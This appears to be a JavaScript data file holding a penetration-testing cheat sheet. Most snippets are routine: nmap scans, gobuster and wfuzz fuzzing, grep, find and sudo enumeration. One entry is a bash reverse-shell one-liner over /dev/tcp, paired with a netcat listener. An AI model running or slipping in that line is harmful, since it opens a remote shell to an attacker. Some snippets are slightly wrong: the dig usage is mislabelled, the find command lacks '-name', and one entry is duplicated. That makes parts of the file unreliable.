export default [
    {
        title: "Scan web path for specific words",
        body: "gobuster dir -u <ip> -w <wordlist>",
        description: "Your OS may have wordlists already, parrot has some e.g: /usr/share/wordlists/dirb/common.txt",
        language: "shell"
    },
    {
        title: "Find IP from name",
        body: "dig <ip>",
        language: "shell"
    },
    {
        title: "Find text in file",
        body: "grep <string> <file>",
        language: "shell"
    },
    {
        title: "Find text in <command>",
        body: "<command> | grep <string>",
        language: "shell"
    },
    {
        title: "Full Range nmap",
        body: "nmap -p- <ip>",
        description: "This will scan all 65535 available ports.",
        language: "shell"
    },
    {
        title: "Fast nmap",
        body: "nmap -F <ip>",
        description: "This will scan the 100 most used ports.",
        language: "shell"
    },
    {
        title: "Remove fingerprint from SSH hostname",
        body: "ssh-keygen -R <ip>",
        language: "shell"
    },
    {
        title: "Find file on system",
        body: "find / -type f <filename> 2>/dev/null",
        description: "Searches from root for a file; 2>/dev/null pipes errors to null e.g. permission errors ;)",
        language: "shell"
    },
    {
        title: "Sudo Priv Check",
        body: "sudo -l",
        description: "Basic enumeration, check special priviledges.",
        language: "shell"
    },
    {
        title: "String Extraction",
        body: "strings <file>",
        description: "Extracts strings from the given binary/data file.",
        language: "shell"
    },
    {
        title: "Standard Netcat listener",
        body: "nc -lvnp <port>",
        description: "-l: Listen mode, -v: verbose, -n: no DNS lookups, -p: Local port. Ports over 1000 do not require sudo.",
        language: "shell"
    },
    {
        title: "Reverse shell in background mode",
        body: "bash -c 'bash -i >& /dev/tcp/ip/1337 2>&1 0>&1' &",
        description: "Should not lock up the machine hence delegating to background.",
        language: "shell"
    },
    {
        title: "Python Simple HTTP Server",
        body: "python -m SimpleHTTPServer <port>",
        description: "For quick hosting of files. Ports over 1000 do not require sudo.",
        language: "shell"
    },
    {
        title: "output text from top",
        body: "head -n 30 <file>",
        description: "Omit -n for the first 10.",
        language: "shell"
    },
    {
        title: "output text from bottom",
        body: "tail -n 30 <file>",
        description: "Omit -n for the last 10.",
        language: "shell"
    },
    {
        title: "Fuzzing using wfuzz",
        body: "wfuzz -f <output file name> -w <path to wordlists> --hc 404 <ip>/FUZZ",
        description: "This outputs results to file name using path to wordlists and ignores 404.",
        language: "shell"
    },
    {
        title: "Making a shell file executable",
        body: "chmod +x <file>",
        language: "shell"
    },
    {
        title: "Remove fingerprint from SSH hostname",
        body: "ssh-keygen -R <ip>",
        language: "shell"
    },
];
